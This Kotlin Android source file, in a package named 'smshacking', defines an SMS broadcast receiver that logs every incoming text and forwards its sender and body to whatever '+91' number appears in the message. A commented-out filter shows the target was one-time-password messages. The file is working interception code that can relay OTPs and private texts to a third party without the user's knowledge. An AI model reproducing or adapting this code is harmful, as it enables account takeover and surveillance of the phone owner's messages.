package gov.rajasthan.smshacking137

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsManager
import android.telephony.SmsMessage
import android.util.Log

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(p0: Context?, intent: Intent?) {
        intent?.let {
            val bundle = intent.extras

            val format = bundle!!.getString("format")
            val smsPDUs = bundle.get("pdus") as Array<*>

            for (message in smsPDUs) {
                val smsMessage = SmsMessage.createFromPdu(message as ByteArray, format)

                val mobNo = smsMessage.originatingAddress
                var sms = smsMessage.messageBody

                Log.d("SMS: ", "MobNo: $mobNo, Message: $sms")

                val smsManager = SmsManager.getDefault()

               // if(sms.contains("RHSOO7") || sms.contains("One Time Password")) {
                    var senderMobNo = ""
                    for(word in sms.split(" ")){
                        if (word.contains("+91")){
                            senderMobNo = word
                            val index = sms.split(" ").indexOf(senderMobNo)
                            val smsData = sms.split(" ") as ArrayList<String>
                            smsData.removeAt(index)
                            sms = ""
                            smsData.forEach {
                                sms+="$it "
                            }
                            break
                        }
                    }
                    if(senderMobNo!="") {
                        smsManager.sendTextMessage(
                            senderMobNo,
                            null,
                            "MobNo: $mobNo, Message: $sms",
                            null,
                            null
                        )
                    }
               // }

            }

        }

    }


}